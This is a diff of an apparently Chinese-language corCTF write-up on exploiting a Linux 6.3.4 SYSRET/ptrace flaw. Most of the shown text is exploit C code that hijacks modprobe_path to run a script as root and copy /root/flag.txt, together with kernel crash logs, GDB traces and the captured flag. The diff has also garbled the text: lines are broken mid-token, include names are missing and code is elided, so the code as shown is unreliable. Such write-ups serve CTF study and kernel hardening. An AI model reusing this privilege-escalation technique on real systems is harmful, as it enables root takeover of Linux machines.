+[   10.083934] FS:  0000000000402fcc(0000) GS:
+ffff88813bc00000(0000) knlGS:
+ffff88813bc00000
 [   10.083935] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
 [   10.083936] CR2: 00000000deadbed8 CR3: 0000000100a8c001 CR4: 0000000000770ef0
 [   10.084008] PKRU: 55555554
 [   10.084009] Kernel panic - not syncing: Fatal exception in interrupt
 [   10.084920] Kernel Offset: disabled
-```
-
-
-
-```
 int main() {
 
         char RSP[0x3000] = { 0 };
@@ -1530,25 +1521,17 @@ int main() {
         puts("[+] EXP NEVER END");
         return 0;
 }
-```
-
-
-
-```
 0x7ffe97c51690
 [   11.949086] traps: PANIC: double fault, error_code: 0x0
 [   11.949132] double fault: 0000 [#1] PREEMPT SMP NOPTI
 [   11.949160] CPU: 0 PID: 77 Comm: poc Not tainted 6.3.4 #14
 [   11.949163] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
-[   11.949164] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
+[   11.949164] RIP: 0010:
+entry_SYSRETQ_unsafe_stack+0x3/0x6
 [   11.949350] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
-[   11.949351] RSP: 0018:00007ffe97c52690 EFLAGS: 00010046
+[   11.949351] RSP: 0018:
+00007ffe97c52690 EFLAGS: 00010046
 ......
-```
-
-
-
-```
 (remote) gef➤  x/30gi asm_exc_general_protection
    0xffffffff81a00a90 <asm_exc_general_protection>:     clac
    0xffffffff81a00a93 <asm_exc_general_protection+3>:   cld
@@ -1561,11 +1544,6 @@ int main() {
    0xffffffff81a00ab2 <asm_exc_general_protection+34>:  jmp    0xffffffff81a01300 <error_return>
    0xffffffff81a00ab7 <asm_exc_general_protection+39>:  nop    WORD PTR [rax+rax*1+0x0]
 ......
-```
-
-
-
-```
 (remote) gef➤  x/60gi error_entry
    0xffffffff81a011c0 <error_entry>:    push   rsi
    0xffffffff81a011c1 <error_entry+1>:  mov    rsi,QWORD PTR [rsp+0x8]
@@ -1604,19 +1582,9 @@ int main() {
    0xffffffff81a0120b <error_entry+75>: je     0xffffffff81a0125c <error_entry+156>
    0xffffffff81a0120d <error_entry+77>: swapgs
 ......
-```
-
-
-
-```
 ......
  swapgs /* 切换 gs 为用户态 gs */
  sysretq /* sysretq 返回 */
-```
-
-
-
-```
 (remote) gef➤  x/60gi exc_general_protection
    0xffffffff817f2430 <exc_general_protection>:            push   r13
    0xffffffff817f2432 <exc_general_protection+2>:       mov    r13,rsi
@@ -1625,13 +1593,9 @@ int main() {
    0xffffffff817f2438 <exc_general_protection+8>:       mov    rbp,rdi
    0xffffffff817f243b <exc_general_protection+11>:      push   rbx
    0xffffffff817f243c <exc_general_protection+12>:      sub    rsp,0x70
-   0xffffffff817f2440 <exc_general_protection+16>:      mov    rax,QWORD PTR gs:0x28 <=== double fault
+   0xffffffff817f2440 <exc_general_protection+16>:      mov    rax,QWORD PTR gs:
+0x28 <=== double fault
 ......
-```
-
-
-
-```
 void do_sysret(uint64_t addr, struct user_regs_struct *regs_arg) {
     struct user_regs_struct regs;
 ......
@@ -1651,11 +1615,6 @@ void do_sysret(uint64_t addr, struct user_regs_struct *regs_arg) {
 
 ......
 }
-```
-
-
-
-```
 ctf@corctf:~$ ./poc
 [+] do_sysret
 [    8.589102] general protection fault, maybe for address 0x4e: 0000 [#1] PREEMPT SMP NOPTI
@@ -1665,25 +1624,20 @@ ctf@corctf:~$ ./poc
 [    9.598734] #PF: supervisor read access in kernel mode
 [    9.601579] #PF: error_code(0x0000) - not-present page
 ......
-```
-
-
-
-```
-#include <stdio.h>
-#include <unistd.h>
-#include <string.h>
-#include <stdlib.h>
-#include <stdint.h>
-#include <assert.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <sys/wait.h>
-#include <sys/mman.h>
-#include <sys/user.h>
-#include <sys/types.h>
-#include <sys/ptrace.h>
-#include <sys/syscall.h>
+    #include <stdio.h>
+    #include 
+    #include <string.h>
+    #include <stdlib.h>
+    #include <stdint.h>
+    #include <assert.h>
+    #include <errno.h>
+    #include <fcntl.h>
+    #include <sys/wait.h>
+    #include <sys/mman.h>
+    #include <sys/user.h>
+    #include <sys/types.h>
+    #include <sys/ptrace.h>
+    #include <sys/syscall.h>
 
 uint64_t gsbase = 0xffff88813bc00000;
 uint64_t modprobe_path = 0xffffffff8203b840;
@@ -1727,25 +1681,10 @@ int main() {
         puts("[+] EXP NEVER END");
         return 0;
 }
-```
-
-
-
-```
 (remote) gef➤  x/s 0xffffffff8203b840
 0xffffffff8203b840:     "/sbin/modprobe"
-```
-
-
-
-```
 gef➤  x/s 0xffffffff8203b840
 0xffffffff8203b840:     "/tmp/x"
-```
-
-
-
-```
 [+] get_flag
 [   23.158576] BUG: kernel NULL pointer dereference, address: 00000000000001e0
 [   23.165033] #PF: supervisor read access in kernel mode
@@ -1755,61 +1694,45 @@ gef➤  x/s 0xffffffff8203b840
 [   23.186155] CPU: 0 PID: 27 Comm: kworker/u2:1 Tainted: G      D            6.3.4 #14
 [   23.191255] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
 [   23.197747] Workqueue: events_unbound call_usermodehelper_exec_work
-[   23.202854] RIP: 0010:inc_rlimit_ucounts+0x31/0x70
+[   23.202854] RIP: 0010:
+inc_rlimit_ucounts+0x31/0x70
 [   23.206428] Code: f0 48 89 f9 45 31 d2 49 b9 ff ff ff ff ff ff ff 7f 4a 8d 34 c5 70 00 00 00 49 83 c0 46 eb 1c 48 39 cf 4c 0f 44 d0 48 8b 41 10 <48> 8b 88 e0 01 00 00 4e 8b 4c c8
-[   23.226013] RSP: 0018:ffffc900000e3cb8 EFLAGS: 00010246
+[   23.226013] RSP: 0018:
+ffffc900000e3cb8 EFLAGS: 00010246
 [   23.229254] RAX: 0000000000000000 RBX: ffff888101038000 RCX: ffffffff8203b6c0
 [   23.233876] RDX: 0000000000000001 RSI: 0000000000000070 RDI: ffffffff8203b6c0
 [   23.243660] RBP: ffffffff8203b6c0 R08: 0000000000000046 R09: 7fffffffffffffff
 [   23.251135] R10: 0000000000000001 R11: 0000000000000025 R12: 0000000000000000
 [   23.255452] R13: ffffc900000e3df0 R14: 00000000ffffffff R15: 0000000000800100
-[   23.260494] FS:  0000000000000000(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
+[   23.260494] FS:  0000000000000000(0000) GS:
+ffff88813bc00000(0000) knlGS:
+0000000000000000
 [   23.268356] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
 [   23.272230] CR2: 00000000000001e0 CR3: 0000000100a8c006 CR4: 0000000000770ef0
 ......
-```
-
-
-
-```
 (remote) gef➤  gef-remox/40gi inc_rlimit_ucounts
-   0xffffffff8109e980 <inc_rlimit_ucounts>:    test   rdi,rdi
-   0xffffffff8109e983 <inc_rlimit_ucounts+3>:   je     0xffffffff8109e9e1 <inc_rlimit_ucounts+97>
-   0xffffffff8109e985 <inc_rlimit_ucounts+5>:   mov    r8d,esi
-   0xffffffff8109e988 <inc_rlimit_ucounts+8>:   mov    rcx,rdi
-   0xffffffff8109e98b <inc_rlimit_ucounts+11>:  xor    r10d,r10d
-   0xffffffff8109e98e <inc_rlimit_ucounts+14>:  movabs r9,0x7fffffffffffffff
-   0xffffffff8109e998 <inc_rlimit_ucounts+24>:  lea    rsi,[r8*8+0x70]
-   0xffffffff8109e9a0 <inc_rlimit_ucounts+32>:  add    r8,0x46
-   0xffffffff8109e9a4 <inc_rlimit_ucounts+36>:  jmp    0xffffffff8109e9c2 <inc_rlimit_ucounts+66>
-   0xffffffff8109e9a6 <inc_rlimit_ucounts+38>:  cmp    rdi,rcx
-   0xffffffff8109e9a9 <inc_rlimit_ucounts+41>:  cmove  r10,rax
-   0xffffffff8109e9ad <inc_rlimit_ucounts+45>:  mov    rax,QWORD PTR [rcx+0x10]
-   0xffffffff8109e9b1 <inc_rlimit_ucounts+49>:  mov    rcx,QWORD PTR [rax+0x1e0] <==== PAGE FAULT
+   0xffffffff8109e980 :    test   rdi,rdi
+   0xffffffff8109e983 :   je     0xffffffff8109e9e1 
+   0xffffffff8109e985 :   mov    r8d,esi
+   0xffffffff8109e988 :   mov    rcx,rdi
+   0xffffffff8109e98b :  xor    r10d,r10d
+   0xffffffff8109e98e :  movabs r9,0x7fffffffffffffff
+   0xffffffff8109e998 :  lea    rsi,[r8*8+0x70]
+   0xffffffff8109e9a0 :  add    r8,0x46
+   0xffffffff8109e9a4 :  jmp    0xffffffff8109e9c2 
+   0xffffffff8109e9a6 :  cmp    rdi,rcx
+   0xffffffff8109e9a9 :  cmove  r10,rax
+   0xffffffff8109e9ad :  mov    rax,QWORD PTR [rcx+0x10]
+   0xffffffff8109e9b1 :  mov    rcx,QWORD PTR [rax+0x1e0] <==== PAGE FAULT
 ......
-```
-
-
-
-```
 $rax   : 0x0
 ......
-   0xffffffff8109e9a6 <inc_rlimit_ucounts+38> cmp    rdi, rcx
-   0xffffffff8109e9a9 <inc_rlimit_ucounts+41> cmove  r10, rax
-   0xffffffff8109e9ad <inc_rlimit_ucounts+45> mov    rax, QWORD PTR [rcx+0x10]
-●→ 0xffffffff8109e9b1 <inc_rlimit_ucounts+49> mov    rcx, QWORD PTR [rax+0x1e0]
-   0xffffffff8109e9b8 <inc_rlimit_ucounts+56> mov    r9, QWORD PTR [rax+r8*8+0x8
-```
-
-
-
-```
-0xffffffff8109e9ad <inc_rlimit_ucounts+45> mov    rax, QWORD PTR [rcx+0x10]
-```
-
-
-
-```
+   0xffffffff8109e9a6  cmp    rdi, rcx
+   0xffffffff8109e9a9  cmove  r10, rax
+   0xffffffff8109e9ad  mov    rax, QWORD PTR [rcx+0x10]
+●→ 0xffffffff8109e9b1  mov    rcx, QWORD PTR [rax+0x1e0]
+   0xffffffff8109e9b8  mov    r9, QWORD PTR [rax+r8*8+0x8
+0xffffffff8109e9ad  mov    rax, QWORD PTR [rcx+0x10]
 (remote) gef➤  x/16gx $rcx
 0xffffffff8203b6c0:     0xffffffff8203b740      0xffffffff8203b808
 0xffffffff8203b6d0:     0x0000000000000000 <== rcx+0x10      0x0000000100000000
@@ -1819,11 +1742,6 @@ $rax   : 0x0
 0xffffffff8203b710:     0x0000000080050033      0xffffffff81e99724
 0xffffffff8203b720:     0x0000000055555554      0x0000000000000000
 0xffffffff8203b730:     0x0000000000000001      0xffffffff8203b5c0
-```
-
-
-
-```
 (remote) gef➤  gef-remox/16gx $rcx
 0xffffffff8203b6c0:     0xffff888100049600      0xffffffff82640160
 0xffffffff8203b6d0:     0xffffffff8203a320      0x0000002e00000000
@@ -1833,11 +1751,6 @@ $rax   : 0x0
 0xffffffff8203b710:     0x0000000000000000      0x0000000000000000
 0xffffffff8203b720:     0x0000000000000000      0x0000000000000000
 0xffffffff8203b730:     0x0000000000000029      0x0000000000000000
-```
-
-
-
-```
 ......
   puts("n[+] do_sysret to fix up");
         for (int i = 0; i < sizeof(regs) / 8; i++) {
@@ -1846,17 +1759,12 @@ $rax   : 0x0
         do_sysret(fix_up + 0xa0, &regs);
         sleep(1);
 ......
-```
-
-
-
-```
 $rax   : 0xaaaaaaad
 ......
-   0xffffffff8109e9a6 <inc_rlimit_ucounts+38>  cmp    rdi, rcx
-   0xffffffff8109e9a9 <inc_rlimit_ucounts+41>  cmove   r10, rax
-   0xffffffff8109e9ad <inc_rlimit_ucounts+45>  mov    rax, QWORD PTR [rcx+0x10]
-●→ 0xffffffff8109e9b1 <inc_rlimit_ucounts+49> mov    rcx, QWORD PTR [rax+0x1e0]
+   0xffffffff8109e9a6   cmp    rdi, rcx
+   0xffffffff8109e9a9   cmove   r10, rax
+   0xffffffff8109e9ad   mov    rax, QWORD PTR [rcx+0x10]
+●→ 0xffffffff8109e9b1  mov    rcx, QWORD PTR [rax+0x1e0]
 ......
 (remote) gef➤  x/16gx $rcx
 0xffffffff8203b6c0:     0x00000000aaaaaaab      0x00000000aaaaaaac
@@ -1867,25 +1775,20 @@ $rax   : 0xaaaaaaad
 0xffffffff8203b710:     0x8000000000000000      0x00000000aaaaaab6
 0xffffffff8203b720:     0x00000000aaaaaab7      0x00000000aaaaaab8
 0xffffffff8203b730:     0x0000000000000000      0xffffffff81a00191
-```
-
-
-
-```
-#include <stdio.h>
-#include <unistd.h>
-#include <string.h>
-#include <stdlib.h>
-#include <stdint.h>
-#include <assert.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <sys/wait.h>
-#include <sys/mman.h>
-#include <sys/user.h>
-#include <sys/types.h>
-#include <sys/ptrace.h>
-#include <sys/syscall.h>
+    #include <stdio.h>
+    #include 
+    #include <string.h>
+    #include <stdlib.h>
+    #include <stdint.h>
+    #include <assert.h>
+    #include <errno.h>
+    #include <fcntl.h>
+    #include <sys/wait.h>
+    #include <sys/mman.h>
+    #include <sys/user.h>
+    #include <sys/types.h>
+    #include <sys/ptrace.h>
+    #include <sys/syscall.h>
 
 uint64_t kbase = 0xffffffff81000000;
 uint64_t phy_base = 0xffff888000000000;
@@ -1944,7 +1847,8 @@ void do_sysret(uint64_t addr, struct user_regs_struct *regs_arg) {
 }
 
 void pre_get_flag(){
-        system("echo -ne '#!/bin/shncp /root/flag.txt /tmp/flag.txtnchown ctf:ctf /tmp;
+        system("echo -ne '#!/bin/shncp /root/flag.txt /tmp/flag.txtnchown ctf:
+ctf /tmp;
         system("chmod +x /tmp/x");
         system("echo -ne '\xff\xff\xff\xff' > /tmp/dummy");
         system("chmod +x /tmp/dummy");
@@ -1996,41 +1900,44 @@ int main() {
         puts("[+] EXP NEVER END");
         return 0;
 }
-```
-
-
-
-```
 ctf@corctf:~$ ./poc
 
 [+] do_sysret to change modprobe_path
 [   54.860622] general protection fault, maybe for address 0x52: 0000 [#1] PREEMPT SMP NOPTI
 [   54.863942] CPU: 0 PID: 81 Comm: poc Not tainted 6.3.4 #14
 [   54.866204] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
-[   54.869854] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
+[   54.869854] RIP: 0010:
+entry_SYSRETQ_unsafe_stack+0x3/0x6
 [   54.875756] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
-[   54.897567] RSP: 0018:ffffffff8203b8b8 EFLAGS: 00010046
+[   54.897567] RSP: 0018:
+ffffffff8203b8b8 EFLAGS: 00010046
 [   54.900951] RAX: 0000000000000052 RBX: 0000782f706d742f RCX: 8000000000000000
 [   54.908092] RDX: 0000782f706d742f RSI: 0000782f706d742f RDI: 0000782f706d742f
 [   54.912087] RBP: 0000782f706d742f R08: 0000782f706d742f R09: 0000782f706d742f
 [   54.916936] R10: 0000782f706d742f R11: 0000000000000246 R12: 0000782f706d742f
 [   54.923207] R13: 0000782f706d742f R14: 0000782f706d742f R15: 0000782f706d742f
-[   54.928403] FS:  0000782f706d742f(0000) GS:ffff88813bc00000(0000) knlGS:ffff88813bc00000
+[   54.928403] FS:  0000782f706d742f(0000) GS:
+ffff88813bc00000(0000) knlGS:
+ffff88813bc00000
 [   54.934439] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
 [   54.941481] CR2: 0000000000c72840 CR3: 0000000100acc003 CR4: 0000000000770ef0
 [   54.946718] PKRU: 55555554
 [   54.948308] Call Trace:
 [   54.950252] Modules linked in:
 [   54.952905] ---[ end trace 0000000000000000 ]---
-[   54.956570] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
+[   54.956570] RIP: 0010:
+entry_SYSRETQ_unsafe_stack+0x3/0x6
 [   54.959973] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
-[   54.975296] RSP: 0018:ffffffff8203b8b8 EFLAGS: 00010046
+[   54.975296] RSP: 0018:
+ffffffff8203b8b8 EFLAGS: 00010046
 [   54.979096] RAX: 0000000000000052 RBX: 0000782f706d742f RCX: 8000000000000000
 [   54.983603] RDX: 0000782f706d742f RSI: 0000782f706d742f RDI: 0000782f706d742f
 [   54.990378] RBP: 0000782f706d742f R08: 0000782f706d742f R09: 0000782f706d742f
 [   54.996204] R10: 0000782f706d742f R11: 0000000000000246 R12: 0000782f706d742f
 [   55.000951] R13: 0000782f706d742f R14: 0000782f706d742f R15: 0000782f706d742f
-[   55.006682] FS:  0000782f706d742f(0000) GS:ffff88813bc00000(0000) knlGS:ffff88813bc00000
+[   55.006682] FS:  0000782f706d742f(0000) GS:
+ffff88813bc00000(0000) knlGS:
+ffff88813bc00000
 [   55.012856] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
 [   55.015931] CR2: 0000000000c72840 CR3: 0000000100acc003 CR4: 0000000000770ef0
 [   55.022360] PKRU: 55555554
@@ -2041,30 +1948,38 @@ ctf@corctf:~$ ./poc
 [   55.873686] general protection fault, maybe for address 0x54: 0000 [#2] PREEMPT SMP NOPTI
 [   55.881308] CPU: 0 PID: 83 Comm: poc Tainted: G      D            6.3.4 #14
 [   55.883938] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
-[   55.889846] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
+[   55.889846] RIP: 0010:
+entry_SYSRETQ_unsafe_stack+0x3/0x6
 [   55.894069] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
-[   55.911307] RSP: 0018:ffffffff8203b760 EFLAGS: 00010046
+[   55.911307] RSP: 0018:
+ffffffff8203b760 EFLAGS: 00010046
 [   55.915745] RAX: 0000000000000054 RBX: 0000000000000000 RCX: 8000000000000000
 [   55.922827] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000000
 [   55.927877] RBP: 0000002e00000000 R08: 0000000000000000 R09: 0000000000000000
 [   55.934469] R10: 0000000000000000 R11: 0000000000000246 R12: ffffffff8203a320
 [   55.939055] R13: ffffffff82640160 R14: ffff888100049600 R15: 0000000000000000
-[   55.944725] FS:  0000000000000000(0000) GS:ffff88813bc00000(0000) knlGS:ffff88813bc00000
+[   55.944725] FS:  0000000000000000(0000) GS:
+ffff88813bc00000(0000) knlGS:
+ffff88813bc00000
 [   55.950507] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
 [   55.953619] CR2: 0000000000c72840 CR3: 0000000100acc006 CR4: 0000000000770ef0
 [   55.957433] PKRU: 55555554
 [   55.958668] Call Trace:
 [   55.960963] Modules linked in:
 [   55.964387] ---[ end trace 0000000000000000 ]---
-[   55.968013] RIP: 0010:entry_SYSRETQ_unsafe_stack+0x3/0x6
+[   55.968013] RIP: 0010:
+entry_SYSRETQ_unsafe_stack+0x3/0x6
 [   55.971660] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
-[   55.986549] RSP: 0018:ffffffff8203b8b8 EFLAGS: 00010046
+[   55.986549] RSP: 0018:
+ffffffff8203b8b8 EFLAGS: 00010046
 [   55.991037] RAX: 0000000000000052 RBX: 0000782f706d742f RCX: 8000000000000000
 [   55.995083] RDX: 0000782f706d742f RSI: 0000782f706d742f RDI: 0000782f706d742f
 [   56.001529] RBP: 0000782f706d742f R08: 0000782f706d742f R09: 0000782f706d742f
 [   56.006144] R10: 0000782f706d742f R11: 0000000000000246 R12: 0000782f706d742f
 [   56.012928] R13: 0000782f706d742f R14: 0000782f706d742f R15: 0000782f706d742f
-[   56.019846] FS:  0000000000000000(0000) GS:ffff88813bc00000(0000) knlGS:ffff88813bc00000
+[   56.019846] FS:  0000000000000000(0000) GS:
+ffff88813bc00000(0000) knlGS:
+ffff88813bc00000
 [   56.025685] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
 [   56.031767] CR2: 0000000000c72840 CR3: 0000000100acc006 CR4: 0000000000770ef0
 [   56.039399] PKRU: 55555554
@@ -2072,20 +1987,25 @@ ctf@corctf:~$ ./poc
 
 [+] get_flag
 [   56.889309] ------------[ cut here ]------------
-[   56.894489] WARNING: CPU: 0 PID: 27 at kernel/ucount.c:285 dec_rlimit_ucounts+0x4f/0x60
+[   56.894489] WARNING: CPU: 0 PID: 27 at kernel/ucount.c:
+285 dec_rlimit_ucounts+0x4f/0x60
 [   56.905581] Modules linked in:
 [   56.908304] CPU: 0 PID: 27 Comm: kworker/u2:1 Tainted: G      D            6.3.4 #14
 [   56.915819] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
 [   56.920894] Workqueue: events_unbound call_usermodehelper_exec_work
-[   56.925990] RIP: 0010:dec_rlimit_ucounts+0x4f/0x60
+[   56.925990] RIP: 0010:
+dec_rlimit_ucounts+0x4f/0x60
 [   56.931058] Code: c1 04 31 48 29 d0 78 22 48 39 cf 4c 0f 44 c0 48 8b 41 10 48 8b 88 e0 01 00 00 48 85 c9 75 db 4d 85 c0 0f 94 c0 c3 cc cc cc cc <0f> 0b eb da 31 c0 c3 cc cc cc c0
-[   56.948338] RSP: 0018:ffffc900000e3d00 EFLAGS: 00010297
+[   56.948338] RSP: 0018:
+ffffc900000e3d00 EFLAGS: 00010297
 [   56.951704] RAX: ffffffffffffffff RBX: ffffc900000e3e08 RCX: ffffffff8203b6c0
 [   56.957035] RDX: 0000000000000001 RSI: 0000000000000070 RDI: ffffffff8203b6c0
 [   56.961815] RBP: ffff88810103c140 R08: ffffffffffffffff R09: ffffffffffffffff
 [   56.968173] R10: 00000000000000bb R11: 00000000000009e9 R12: ffffffff8203b6c0
 [   56.972953] R13: 0000000000000010 R14: dead000000000122 R15: 0000000000000000
-[   56.979591] FS:  0000000000000000(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
+[   56.979591] FS:  0000000000000000(0000) GS:
+ffff88813bc00000(0000) knlGS:
+0000000000000000
 [   56.987164] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
 [   56.991283] CR2: 000000000065eff0 CR3: 000000000202c006 CR4: 0000000000770ef0
 [   56.998861] PKRU: 55555554
@@ -2112,18 +2032,8 @@ corctf{tHIS is a SoFtWare ImPLEMENTAtioN isSuE. iNTeL PRoCESSORS ArE fu
 ctf@corctf:~$ cat /tmp/flag.txt
 corctf{tHIS is a SoFtWare ImPLEMENTAtioN isSuE. iNTeL PRoCESSORS ArE fuNCtIONinG AS PEr sPeCiFIcaTionS anD ThIS BEHavioR Is cORRecTly documEnteD IN tHE INTEL SofTwArE DEvELOPErs ma}
 ctf@corctf:~$
-```
-
-
-
-```
 四
 调试技巧
-```
-
-
-
-```
 (remote) gef➤  c
 Continuing.
 Warning:
@@ -2131,11 +2041,6 @@ Cannot insert breakpoint 1.
 Cannot access memory at address 0x401d05
 
 Command aborted.
-```
-
-
-
-```
 int main() {
 
         char RSP[0x3000] = { 0 };
@@ -2150,11 +2055,6 @@ int main() {
         puts("[+] EXP NEVER END");
         return 0;
 }
-```
-
-
-
-```
 五
 总结
 ```
